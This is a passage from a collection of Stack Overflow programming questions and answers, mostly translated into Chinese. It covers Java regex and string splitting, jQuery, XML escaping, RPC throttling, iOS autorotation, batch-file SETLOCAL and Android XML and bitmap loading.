我的问题是我只能用动画更新 CALayer，而不是通过设置它的内容（属性“路径”的 CGPath）。似乎唯一的解决方案是首先删除图层的所有动画，然后设置新路径：

```
[_myLayer removeAllAnimations];
UIBezierPath *newPath = ...
_myLayer.path = newPath.CGPath; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-05-04T13:03:49.943

自我注意：或者从未设置过 CALayer 的框架。每当 CALayer 出现问题时，首先要确保它的框架！= NSZeroRect。

# java - 使用正则表达式在字符串中查找多个匹配项的索引的问题

> ID：13704200
> 
> 赞同：3
> 
> 时间：2012-12-04T13:36:47.640
> 
> 标签：java, regex, string

我正在尝试使用正则表达式（下面的测试代码）在字符串中查找多个匹配项的索引，以便与外部库一起使用。

```
static String content = "a {non} b {1} c {1}";
static String inline = "\\{[0-9]\\}";
public static void getMatchIndices()
{
    Pattern pattern = Pattern.compile(inline);
    Matcher matcher = pattern.matcher(content)
    while (matcher.find())
    {
        System.out.println(matcher.group());
        Integer i = content.indexOf(matcher.group());
        System.out.println(i);
    }
} 
```

输出：

```
{1}
10
{1}
10 
```

它找到两个组，但返回两个组的索引 10。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:46:25.060

来自[http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/String.html#indexOf(java.lang.String](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/String.html#indexOf(java.lang.String) )：

> 返回此字符串中第一次出现指定子字符串的索引。

由于两者都匹配相同的事物（'{1}'），因此在两种情况下都会返回第一个匹配项。

您可能想使用[Matcher#start()](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/regex/Matcher.html#start%28%29)来确定比赛的开始。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:04:34.987

你可以用正则表达式来做到这一点。下面将找到字符串中的位置。

```
static String content = "a {non} b {1} c {1}";
static String inline = "\\{[0-9]\\}";

public static void getMatchIndices()
{
    Pattern pattern = Pattern.compile(inline);
    Matcher matcher = pattern.matcher(content);

    int pos = 0;
    while (matcher.find(pos)) {
        int found = matcher.start();
        System.out.println(found);
        pos = found +1;
    }
} 
```

# jquery - Jquery remove 不删除元素

> ID：13704202
> 
> 赞同：0
> 
> 时间：2012-12-04T13:36:56.750
> 
> 标签：jquery

我用jquery制作了动态表单。一切正常，只是不是删除按钮。我无法让它工作。我很确定解决方案非常简单，有人可以帮助我。我也让它在小提琴上运行：http: [//jsfiddle.net/tjyEH/1/](http://jsfiddle.net/tjyEH/1/)

```
<div class="page" data-iscroll id="page">   
<script type="text/javascript">

    $('#addTilluft').click(function() {
        id = $('div#select_col select:last').attr('id');
        id = id.substr(id.indexOf("_") + 1);
        id++;
        $('<div style="height: 35px;"><select name="tilluftRoom[]" id="tilluftRoom_'+ id + '" data-mini="true" data-corners="false"><option value="val1">Val 1</option><option value="val2">Val 2</option><option value="val3">Val 3</option></select></div>').appendTo('#select_col');
        $('<div style="height: 36px;"><input id="tilluftValue_' + id + '" name="tilluftValue[]" data-mini="true" data-corners="false"></div>').appendTo('#input_col');
        $('<div style="height: 31px;"><a href="#" id="removeTilluft_'+id+'" onclick="Removetilluft(this.id)" data-role="button" data-icon="delete" data-iconpos="notext">Delete</a></div>').appendTo('#remove_col');

        $("#tilluftRoom_" + id).selectmenu();
        $("#removeTilluft_" + id).button();
        $("#tilluftValue_" + id).textinput();
        $("#tilluftRoom_" + id).selectmenu('refresh');          
        $("#removeTilluft_" + id).button('refresh');          
        $("#tilluftValue_" + id).textinput('refresh');          

   });

   function Removetilluft(id) { 
       id = id.substr(id.indexOf("_") + 1);

       $('#tilluftRoom_' + id).remove();
       $('#tilluftValue_' + id).remove();
       $('#removeTilluft_' + id).remove();

   };
 </script>     

               <form action="<?=base_url()?>index.php/welcome/showinput" method="post" data-ajax="false" id="tilluft_form"> 
                  <div id="tilluft"> 
                  <h3>Tilluft</h3>
                        <div id="select_col" class="ui-block-a">
                            <div style="height: 35px;">
                             <select name="tilluftRoom[]" id="tilluftRoom_1" data-mini="true" data-corners="false">
                                <option value="val1">Val 1</option>
                                <option value="val2">Val 2</option>
                                <option value="val3">Val 3</option>
                                <option value="val4">Val 4</option>    
                                <option value="val5">Test</option>    
                             </select> 
                            </div>
                        </div>
                        <div id="input_col" class="ui-block-b">
                             <div style="height: 36px;">
                              <input name="tilluftValue[]" id="tilluftValue_1" data-mini="true" data-corners="false">
                             </div>
                        </div>
                        <div id="remove_col" class="ui-block-c" style="width:35px;">
                             <div style="height: 28px;">
                              <a href="#" id="removeTilluft_1" onclick="Removetilluft(this.id)"data-role="button" data-icon="delete" data-iconpos="notext">Delete</a> 
                             </div>
                        </div>

                         <a id="addTilluft"  href="#" data-role="button" data-icon="add" data-mini="true" data-inline="true" data-corners="false">Add one more</a> 

                  </div>

               </form>   
               <input type="submit" form="tilluft_form" value="Submit Form" data-mini="true" data-inline="true" data-corners="false"/>
          </div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:45:33.207

```
Removetilluft(id) { is defined in `$(window).load(function(){`. Therefor it is not defined as global variable and can't be found by your onclick function 
```

像`Removetilluft`这样全局化：`window.Removetilluft = Removetilluft;`

```
$(window).load(function(){

....    

       function Removetilluft(id) { 
           id = id.substr(id.indexOf("_") + 1);

           $('#tilluftRoom_' + id).remove();
           $('#tilluftValue_' + id).remove();
           $('#removeTilluft_' + id).remove();      
       };
}); 
```

# java - 在 Java 中转义有效的 XML 字符

> ID：13704205
> 
> 赞同：0
> 
> 时间：2012-12-04T13:36:59.777
> 
> 标签：java, xml, xml-parsing

我有一个看起来像这样的字符串：

```
<tag1><tag2>Text</tag2> > AnotherText</tag1> 
```

我正在使用 XMLOutputFactoryImpl 将该 XML 解析为一个字符串，但是，我也需要将单个“大于”（就在另一个文本之前）转义，即使它在那里是合法的。

你有什么想法我需要如何配置我的 OutputFactory 来让它工作吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T15:49:20.837

无法重现您的问题。这是我的代码（我使用 rt.jar 中的默认 StAX）：

```
 XMLOutputFactory of = XMLOutputFactory.newInstance();
    System.out.println(of.getClass());
    XMLStreamWriter ow = of.createXMLStreamWriter(System.out);
    ow.writeStartElement("tag1");
    ow.writeStartElement("tag2");
    ow.writeCharacters("Text");
    ow.writeEndElement();
    ow.writeCharacters("> AnotherText");
    ow.writeEndElement();
    ow.close(); 
```

输出

```
<tag1><tag2>Text</tag2>&gt; AnotherText</tag1> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:48:52.423

如果您使用的是 XML api（DOM、StAX 或 JAXB），那么内容将自动为您转义。您也可以为此使用 CDATA 部分。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:45:04.583

您可以使用 apache 公共语言库来转义字符串。

org.apache.commons.lang.StringEscapeUtils

```
String escapedXml = StringEscapeUtils.escapeXml("the data might contain & or ! or % or ' or # etc"); 
```

更新的答案：

最好的解决方案是修复生成文本输入的程序。最简单的此类修复将涉及与建议的其他答案一样的转义实用程序。如果这不是一个选项，我会使用像这样的正则表达式

```
</?[a-zA-Z]+ */?> 
```

匹配预期的标签，然后将字符串拆分为标签（您希望通过它保持不变）和标签之间的文本（您希望应用转义方法。）

我不会指望 XML 解析器能够为您做这件事，因为您正在处理的不是有效的 XML。现有的缺乏转义可能会产生歧义，因此您可能也无法完成完美的工作。

# java - Request Queue implementation

> ID：13704211
> 
> 赞同：0
> 
> 时间：2012-12-04T13:37:25.033
> 
> 标签：java, rpc, request-queueing

I am currently involved in doing POC for an RPC layer. I have written the following method to throttle requests on the client side. Is this a good pattern to follow? I did not choose queueing the additional requests into a threadpool because I am interested only in synchronous invocations and I want the caller thread to block until it is woken up for executing the RPC request and also because threadpool seems additional overhead because of creation of additional threads.

I thought I can manage with the threads which are already issuing the requests. This works well, but the CPU usage is a bit unfair to other processes because as soon as a call ends, another call goes out. I load tested it with a huge number of requests and memory and CPU usage are stable. Can I somehow use ArrayBlockingQueue with poll to achieve the same? Is poll() too much of a CPU hog?

Note: I recognise a few concurrency issues with requestEnd method where it might not wake up all registered items correctly and I am thinking of a performant way to maintain atomicity there.

```
 public class RequestQueue {    
    // TODO The capacity should come from the consumer which in turn comes from
    // config
    private static final int _OUTBOUND_REQUEST_QUEUE_MAXSIZE = 40000;
    private static final int _CURRENT_REQUEST_QUEUE_INCREMENT = 1;
    private static final int _CURRENT_REQUEST_POOL_MAXSIZE = 40;
    private AtomicInteger currentRequestsCount = new AtomicInteger(0);
    private ConcurrentLinkedQueue<RequestWaitItem> outboundRequestQueue = null;

    public RequestQueue() {
        outboundRequestQueue = new ConcurrentLinkedQueue<RequestWaitItem>();
    }

    public void registerForFuture(RequestWaitItem waitObject) throws Exception {
        if (outboundRequestQueue.size() < _OUTBOUND_REQUEST_QUEUE_MAXSIZE) {
            outboundRequestQueue.add(waitObject);
        } else {
            throw new Exception("Queue is full" + outboundRequestQueue.size());
        }
    }

    public void requestStart() {
        currentRequestsCount.addAndGet(_CURRENT_REQUEST_QUEUE_INCREMENT);
    }

    //Verify correctness
    public RequestWaitItem requestEnd() {
        int currentRequests = currentRequestsCount.decrementAndGet();
        if (this.outboundRequestQueue.size() > 0 && currentRequests < _CURRENT_REQUEST_POOL_MAXSIZE) {
            try {
                RequestWaitItem waitObject = (RequestWaitItem)this.outboundRequestQueue.remove();               
                waitObject.setRequestReady(true);
                synchronized (waitObject) {
                    waitObject.notify();
                }   
                return waitObject;
            } catch (NoSuchElementException ex) {
                //Queue is empty so this is not an exception condition
            }
        }
        return null;
    }

    public boolean isFull() {
        return currentRequestsCount.get() > _CURRENT_REQUEST_POOL_MAXSIZE;
    }

}

public class RequestWaitItem {
    private boolean requestReady;
    private RpcDispatcher dispatcher;

    public RequestWaitItem() {
        this.requestReady = false;
    }

    public RequestWaitItem(RpcDispatcher dispatcher) {
        this();
        this.dispatcher = dispatcher;
    }

    public boolean isRequestReady() {
        return requestReady;
    }

    public void setRequestReady(boolean requestReady) {
        this.requestReady = requestReady;
    }

    public RpcDispatcher getDispatcher() {
        return dispatcher;
    }
}

if (requestQueue.isFull()) {
        try {               
                RequestWaitItem waitObject = new RequestWaitItem(dispatcher);               
                requestQueue.registerForFuture(waitObject);
                //Sync              
                // Config and centralize this timeout
                synchronized (waitObject) {
                    waitObject.wait(_REQUEST_QUEUE_TIMEOUT);
                }

                if (waitObject.isRequestReady() == false) {
                    throw new Exception("Request Issuing timedout");
                }
                requestQueue.requestStart();
                try {
                    return waitObject.getDispatcher().dispatchRpcRequest();
                }finally {
                    requestQueue.requestEnd();
                }               
        } catch (Exception ex) {
            // TODO define exception type
            throw ex;
        }
    } else {
        requestQueue.requestStart();
        try {
            return dispatcher.dispatchRpcRequest();
        }finally {              
            requestQueue.requestEnd();
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:20:58.810

If I understood correctly, you want to throttle requests to remote service, by having at most 40 (say) concurrent requests. You can do this easily, without extra threads or services, with a semaphore.

```
Semaphore s = new Semaphore(40);
...
s.acquire();
try {
    dispatcher.dispatchRpcRequest(); // Or whatever your remote call looks like
} finally {
    s.release();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:11:08.167

Use `ExecutorService service = Executors.newFixedThreadPool(10);` for this.

This will create at the **max 10 threads** and further requests will wait in the queue. I guess this should help.

[Fixed Thread Pool](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/Executors.html#newFixedThreadPool%28int%29)

# grails - cloudfoundry 是否支持针对 java 1.7 编译的 grails 应用程序？

> ID：13704215
> 
> 赞同：0
> 
> 时间：2012-12-04T13:37:28.560
> 
> 标签：grails, java-7, cloud-foundry

当我尝试将基于 java 1.7 的 Grails 应用程序部署到 cloudfoundry 时，出现以下错误：

```
Caused by: java.lang.UnsupportedClassVersionError: grails/plugin/cache/CacheConfigArtefactHandler : Unsupported major.minor version 51.0 (unable to load class grails.plugin.cache.CacheConfigArtefactHandler) 
```

我以为我在某处读到现在支持此功能？

```
Detected a Java SpringSource Grails Application, is this correct? [Yn]:
Application Deployed URL [my-project.cloudfoundry.com]:
Memory reservation (128M, 256M, 512M, 1G, 2G) [512M]:
How many instances? [1]:
Bind existing services to 'my-project'? [yN]: y
1: rabbitmq-67ae5
Which one?: 1
Create services to bind to 'my-project'? [yN]:
Would you like to save this configuration? [yN]:
Creating Application: OK
Binding Service [rabbitmq-67ae5]: OK
Uploading Application:
Checking for available resources: OK
Processing resources: OK
Packing application: OK
Uploading (20K): OK
Push Status: OK
Staging Application 'my-project': OK
Starting Application 'my-project': ... 
```

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T14:00:46.427

可以，但是需要记得在部署的时候指定运行时；

vmc push my_app --runtime=java7

# ios - ios6自动旋转纵向倒置为纵向

> ID：13704218
> 
> 赞同：0
> 
> 时间：2012-12-04T13:38:01.273
> 
> 标签：ios, uiviewcontroller, ios4, autorotate

请不要建议我在 1 个版本中轮换 ios 4.3-6.0 是一个坏主意，因为我告诉过很多次但没有听我的。

在项目设置中，我已将所有界面方向设置为受支持，以确保。

现在我正在用 iphone4 在 ios6 上进行测试。从 app delegate 开始，它是一个代码，如下所示：

```
mainController = [[MainViewController alloc] initWithNibName:nil bundle:nil];

navigationController=[[RotatingNavigationController alloc] initWithRootViewController:mainController];          
navigationController.navigationBar.hidden =true;

// ios: 4 and 5
//[window addSubview:navigationController.view];

//ios6:
window.rootViewController = navigationController;

[window makeKeyAndVisible]; 
```

所以我做了2个自定义类，在可能的情况下推荐用于自动旋转，并且为他们解决了问题。

RotatingNavigationController 是一个自定义`UINavigationController`的，代码有点难看，但是我从这个论坛收集了这些部分，所以应该允许发布它：

```
@implementation RotatingNavigationController

- (id)init {
    self = [super init];
    if (self) {        
        self.view.autoresizesSubviews = YES;
        [self.view setAutoresizingMask:(UIViewAutoresizingFlexibleHeight | UIViewAutoresizingFlexibleWidth)];
    }
    return self;
}

// ios6 require this method for rotation detection, available from ios5, ios4.3 not available: sux
//- (void)viewWillLayoutSubviews
//{
    //UIInterfaceOrientation statusBarOrientation = [UIApplication sharedApplication].statusBarOrientation;

    //[[NSNotificationCenter defaultCenter]     postNotificationName:UIDeviceOrientationDidChangeNotification     object:nil];

//    [[NSNotificationCenter defaultCenter] addObserver:self                                              selector:@selector(orientationChanged:)                                                  name:UIDeviceOrientationDidChangeNotification                                                object:nil];

    /*
    if(UIInterfaceOrientationIsLandscape(statusBarOrientation)){
        [self willRotateToInterfaceOrientation: statusBarOrientation duration: 0.3 ];
    }
    else{
        [self willRotateToInterfaceOrientation: statusBarOrientation duration: 0.3 ];
    }
    */
//}

//ios 4.3 and ios 5.0, at ios6 it isn't called by iOS...sux
- (void)willRotateToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration{
    [self.visibleViewController willRotateToInterfaceOrientation:toInterfaceOrientation duration:duration];
}

// //ios 4.3 and ios 5.0, at ios6 need different methods, which sux
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
    return YES;
} 

//Autorotation is changing in iOS 6\. In iOS 6, the shouldAutorotateToInterfaceOrientation: method of UIViewController is deprecated. In its place, you should use the supportedInterfaceOrientationsForWindow: and shouldAutorotate methods.

// ios6
- (NSUInteger)supportedInterfaceOrientationsForWindow:(UIWindow *)window
{
    return UIInterfaceOrientationMaskAll;
}

// ios6
- (BOOL)shouldAutorotate
{
    return YES;
}
// ios6
- (UIInterfaceOrientation)preferredInterfaceOrientationForPresentation {
    return UIInterfaceOrientationMaskPortrait;
}
@end 
```

*   这应该会正确生成自动旋转通知，我认为他完成了他的工作。

这`MainViewController`是一种习惯`UIViewController`。

只是为了确保我已经复制粘贴了代码：

```
// Override to allow orientations other than the default portrait orientation.
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
    // Return YES for supported orientations
    //    return (interfaceOrientation == UIInterfaceOrientationPortrait);
    return YES;
}

// ios6:
- (NSUInteger)supportedInterfaceOrientationsForWindow:(UIWindow *)window
{
    return UIInterfaceOrientationMaskAll;
}

// ios6
- (BOOL)shouldAutorotate
{
    return YES;
}

- (UIInterfaceOrientation)preferredInterfaceOrientationForPresentation {
    return UIInterfaceOrientationMaskPortrait;
} 
```

他的工作是根据设备状态（旋转）更改不同的 UIViewController

我在某个地方有一个菜单屏幕，它有不同的 xib，但也有 h 和 m 文件（因为有不同的元素，不会出现在 Portait 或 Landscape 中。（我没有能力改变整个架构）

代码的一部分 - 这里应该有一些问题，我认为在这个主控制器下面：

```
#pragma mark
#pragma mark Rotation
- (void)orientationChanged:(NSNotification *)notification
{
UIDeviceOrientation deviceOrientation = [UIDevice currentDevice].orientation;
    UIInterfaceOrientation statusBarOrientation = [UIApplication sharedApplication].statusBarOrientation; 

    if(deviceOrientation == UIDeviceOrientationFaceUp || deviceOrientation == UIDeviceOrientationFaceDown){
        if(debug){
            NSLog(@"Nothing to change because it is gone to Flat");
        }
        return;
    }
NSArray *viewControllers = [self.navigationController viewControllers];

if (UIDeviceOrientationIsLandscape(deviceOrientation)){

        //if(debug)
        //    NSLog(@"Portait -> Landscape size : %3.0fw, %3.0fh", self.view.bounds.size.width, self.view.bounds.size.height);
        id lastviewController = viewControllers.lastObject;
        // check what is there:
        if([lastviewController isKindOfClass:[MenuController class]]){                 
            [self.navigationController popViewControllerAnimated:NO];
            [self.navigationController pushViewController:menuLandscape animated:NO];
            NSLog(@"poped Menu Portrait, pushed Menu Landscape");
        }
...
else if(UIDeviceOrientationIsPortrait(deviceOrientation)){
    //else if(UIInterfaceOrientationIsLandscape(statusBarOrientation)){

        //if(debug)
        //    NSLog(@"Landscape -> Portait , size : %3.0fw, %3.0fh", self.view.bounds.size.width, self.view.bounds.size.height);
        id lastviewController = viewControllers.lastObject;
        // check what is there:
        if([lastviewController isKindOfClass:[MenuLandscapeController class]]){
            [self.navigationController popViewControllerAnimated:NO];            
            [self.navigationController pushViewController:menuPortait animated:NO];
        } 
... 
```

问题是：景观被取出并被​​推到肖像上，当它倒置时，但那个肖像没有旋转并且它显示出一个破碎的布局。

我怎样才能唤醒那个控制器并告诉他该旋转了，因为它不是纵向模式？

感谢与我关于架构更改之外的任何改进的问题相关的任何建议。

更新：

在 app delgate 没有帮助添加：

```
- (NSUInteger)application:(UIApplication *)application supportedInterfaceOrientationsForWindow:(UIWindow *)window{
    return UIInterfaceOrientationMaskAll;
} 
```

其他答案的代码：[在此处介绍](https://stackoverflow.com/questions/12566780/presentviewcontroller-not-supporting-orientation-in-ios-6)

更新2：

```
UIInterfaceOrientation statusBarOrientation = [UIApplication sharedApplication].statusBarOrientation; 
```

由于某种原因不想`UIInterfaceOrientationPortraitUpsideDown = UIDeviceOrientationPortraitUpsideDown`取值，我认为需要解决。

Update3：非常仔细地阅读了两次和第三次[ios6 发行说明](http://developer.apple.com/library/ios/#releasenotes/General/RN-iOSSDK-6_0/_index.html)

> 系统通过将应用程序的supportedInterfaceOrientationsForWindow: 方法返回的值与最顶部全屏控制器的supportedInterfaceOrientations 方法返回的值相交来确定是否支持方向。

*   现在再读一遍:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T14:59:47.910

将此类别添加到不旋转的视图控制器

```
@implementation UINavigationController(Rotation)

-(NSUInteger)supportedInterfaceOrientations {
    return UIInterfaceOrientationMaskAll;
}

@end 
```

# javascript - wmuSlider 脚本不适用于自定义导航容器

> ID：13704222
> 
> 赞同：0
> 
> 时间：2012-12-04T13:38:07.547
> 
> 标签：javascript, jquery, slider

我正在尝试让一个名为 wmuSlider 的 jquery 滑块与自定义导航链接一起使用。此选项不会出现在演示页面上，但在 GitHub 上有一个脚本修改以允许此选项： [https ://github.com/adamcoulombe/wmuSlider/commit/3338599d373d61043caeb3bfbc2f644445d1bdb1#commitcomment-2249331](https://github.com/adamcoulombe/wmuSlider/commit/3338599d373d61043caeb3bfbc2f644445d1bdb1#commitcomment-2249331)

我正在尝试以这种方式制作我的自定义导航链接：

```
<a class="wmuSliderPrev custom"> Anterior </a> | <a class="wmuSliderNext custom"> Proximo </a> 
```

这与脚本放在页面上的方式相同（通过 Firebug 透视）。

我的定制不工作，原来的工作。

我的自定义链接是黄色背景的链接

在这里查看我的代码：[http ://www.alsite.com.br/soverde/demo/](http://www.alsite.com.br/soverde/demo/)

谁能帮我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T11:18:08.810

根据开发脚本修改的人的说法，这是正确的方法：

```
$(".wmuSlider").wmuSlider({
   navigationContainer: $("#someElementWhereverIWantOnThePage")
}); 
```

链接：[https ://github.com/adamcoulombe/wmuSlider/commit/3338599d373d61043caeb3bfbc2f644445d1bdb1#commitcomment-2253443](https://github.com/adamcoulombe/wmuSlider/commit/3338599d373d61043caeb3bfbc2f644445d1bdb1#commitcomment-2253443)

# batch-file - 如何在批处理文件中使用 SETLOCAL？

> ID：13704223
> 
> 赞同：40
> 
> 时间：2012-12-04T13:38:07.780
> 
> 标签：batch-file

你如何`setlocal`在批处理文件中使用？我只是在学习脚本，并希望用非常简单的术语向我解释它。

我有一个脚本停止并说它`< was unexpected at this time`可能与`setlocal`脚本中没有任何语句有关。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-12-04T13:46:10.623

你做第一行`SETLOCAL`。这个例子来自下面的链接文章：

```
rem *******Begin Comment**************
rem This program starts the superapp batch program on the network,
rem directs the output to a file, and displays the file
rem in Notepad.
rem *******End Comment**************
@echo off
setlocal
path=g:\programs\superapp;%path%
call superapp>c:\superapp.out
endlocal
start notepad c:\superapp.out 
```

最常见的用法`SETLOCAL`是打开命令扩展并允许延迟扩展变量：

```
SETLOCAL ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION 
```

有关详细信息，`SETLOCAL`请参阅 Microsoft TechNet 上的[命令行参考](http://technet.microsoft.com/en-us/library/cc754340.aspx)。

直接链接到[Setlocal](http://technet.microsoft.com/en-us/library/cc772046.aspx)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-12-04T16:40:50.180

假设这段代码：

```
If "%getOption%" equ  "yes" (
   set /P option=Enter option: 
   echo Option read: %option%
) 
```

以前的代码将不起作用，因为 %option% 值仅在解析 IF 命令时（在执行之前）被替换一次。您需要“延迟”变量值扩展，直到 SET /P 命令修改了变量值：

```
setlocal EnableDelayedExpansion
If "%getOption%" equ  "yes" (
   set /P option=Enter option: 
   echo Option read: !option!
) 
```

检查这个：

```
set var=Before
set var=After & echo Normal: %var%  Delayed: !var! 
```

猜猜输出是什么...

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2019-06-02T04:29:20.593

尝试这个：

`SET PATH=%PATH%;%~dp0;`

这将获取您正在运行批处理的本地文件夹并将其添加到当前路径。

**示例**：如果您正在运行 a`.bat`或`.cmd`from `d:\tools\mybatch.bat` ，它将添加`d:\tools`到当前路径，以便它可以在该文件夹中找到其他文件。

# java - Java：字符串拆分行为怪异

> ID：13704229
> 
> 赞同：2
> 
> 时间：2012-12-04T13:38:32.990
> 
> 标签：java, string, split

```
public String getPriceString() {
    String priceString = "45.0";
    String[] priceStringArray = priceString.split(".");
    return priceStringArray.length + "";
} 
```

为什么这给我一个0，零？这不应该是2吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T13:40:18.483

to 的参数[`split()`](http://docs.oracle.com/javase/7/docs/api/java/lang/String.html#split%28java.lang.String%29)是一个正则表达式，点在正则表达式中有特殊的含义（它匹配任何字符）。

尝试`priceString.split("[.]");`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T13:40:06.690

你需要这样`.`逃跑

```
String[] priceStringArray = priceString.split("\\."); 
```

`split`将正则表达式作为参数，`.`表示任何字符。

[http://docs.oracle.com/javase/6/docs/api/java/util/regex/Pattern.html#sum](http://docs.oracle.com/javase/6/docs/api/java/util/regex/Pattern.html#sum)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:40:02.183

`.`用反斜杠转义，如`\\.`. `.`是任何东西的正则表达式**元字符**。您必须将其转义`\\.`才能使其视为**正常角色**

```
 String priceString = "45.0";
        String[] priceStringArray = priceString.split("\\."); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:40:09.033

`String.split`采用正则表达式模式。您正在传递，`.`这意味着您要拆分*任何字符*。

您*可以*将`"\\."`其用作拆分模式-但就我个人而言，我会改用[番石榴](http://guava-libraries.googlecode.com)：

```
private static final Splitter DOT_SPLITTER = Splitter.on('.');
... 
```

（如果你还没有使用 Guava，你会在那里找到*很多*好东西。）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T13:41:01.823

您需要转义`.`，`\\.`因为`.`在正则表达式中具有特殊含义。

```
String priceString = "45.0";
String[] priceStringArray = priceString.split("\\.");
return priceStringArray.length + ""; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-04T13:42:38.520

使用`String[] priceStringArray = priceString.split("\\.");` 您将不得不使用转义序列。

# java - 从本地文件而不是从 URL 解析 XML

> ID：13704234
> 
> 赞同：1
> 
> 时间：2012-12-04T13:38:52.247
> 
> 标签：java, android, xml, parsing, url

所以在你的指南之后，我将代码更改为这个，但应用程序只是挂起......从这里下一步是什么？调用 getXML

```
Document xml = XMLemailF.getXML(); 
```

.

```
 public static Document getXML(){     
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

    // get a document builder
    DocumentBuilder db = null;
    try {
        db = dbf.newDocumentBuilder();
    } catch (ParserConfigurationException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    //parse using builder to get DOM representation of the XML file
    Document doc = null;
    try {
        doc = db.parse("/xxxxxx/res/xml/email.xml");
    } catch (SAXException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    return doc;

} 
```

这就是所谓的

```
public static int numResults(Document doc){     
    Node results = doc.getDocumentElement();
    int res = -1;

    try{
        res = Integer.valueOf(results.getAttributes().getNamedItem("count").getNodeValue());
    }catch(Exception e ){
        res = -1;
    }

    return res;
} 
```

通过这个

```
...
Document xml = XMLemailF.getXML();

    int numResults = XMLemailF.numResults(xml);

    if((numResults <= 0)){
        Toast.makeText(contactus_email.this, "No results found", Toast.LENGTH_LONG).show();  
        finish();
    }

    NodeList nodes = xml.getElementsByTagName("result");

    for (int i = 0; i < nodes.getLength(); i++) {                           
        HashMap<String, String> map = new HashMap<String, String>();    

        Element e = (Element)nodes.item(i);
        map.put("email", XMLemailF.getValue(e, "email"));
        map.put("line1", XMLemailF.getValue(e, "line1"));
        mylist.add(map);
... 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:51:35.050

当然可以

尝试类似：

```
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// get a document builder
DocumentBuilder db = dbf.newDocumentBuilder();

//parse using builder to get DOM representation of the XML file
Document doc = db.parse("yourFile.xml"); 
```

并查看这些类的 javadoc 以获取更多信息

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-21T16:47:23.753

像这样使用**application.getResourceAsStream("your file name")**：

```
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(application.getResourceAsStream("file.xml")); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:06:15.317

这是使用[SAXParser](http://www.jondev.net/articles/Android_XML_SAX_Parser_Example)读取 sdcard 上的 xml 文件的方法

```
public static RSSFeed parseLocalXml(String filename){
    try {

        SAXParserFactory factory = SAXParserFactory.newInstance();
        factory.setNamespaceAware(true);

        SAXParser parser = factory.newSAXParser();

        XMLReader xmlreader = parser.getXMLReader();

        RSSHandler theRssHandler = new RSSHandler();

        xmlreader.setContentHandler(theRssHandler);

        InputSource is = new InputSource(new FileInputStream(filename));

        xmlreader.parse(is);

        return theRssHandler.getFeed();//this is handler that reads trough xml nodes
    } catch (Exception ee) {

        return null;
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:49:51.967

您是否需要从本地文件中获取 xml DOM？我理解对了吗？

```
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new FileInputStream("/path/to/your/file.xml"); 
```

或者

```
Document doc = builder.parse(getClass().getResourceAsStream("/path/to/your/resource.xml")); 
```

# android - BitmapFactory.decodeStream(input) 总是返回 null

> ID：13704237
> 
> 赞同：0
> 
> 时间：2012-12-04T13:39:04.880
> 
> 标签：android, list, bitmap, bitmapfactory

我这里有个问题。

我在列表中有一些图片网址

```
agenda.get(i).getPicture() // always return a good image url 
```

在一个线程中我这样做：

```
 for (int i = 0; i < agenda.size(); i ++)
        {
            Log.e("TEST", "  = " +agenda.get(i).getPicture());
            Bitmap newBitmap = getBitmapFromURL(agenda.get(i).getPicture()); // getPicture return the url
            imagelist.add(i,newBitmap);
        } 
```

并且 getBitmapFromURL 返回空原因：

```
BitmapFactory.decodeStream(input) 
```

在 ：

```
private Bitmap getBitmapFromURL(final String src) {
    Runnable r=new Runnable()
    {
        public void run() {
            try {
                URL url = new URL(src);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setDoInput(true);
                connection.connect();
                InputStream input = connection.getInputStream();
                myBitmap = BitmapFactory.decodeStream(input);
                connection.disconnect();
            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    };
    return myBitmap;
} 
```

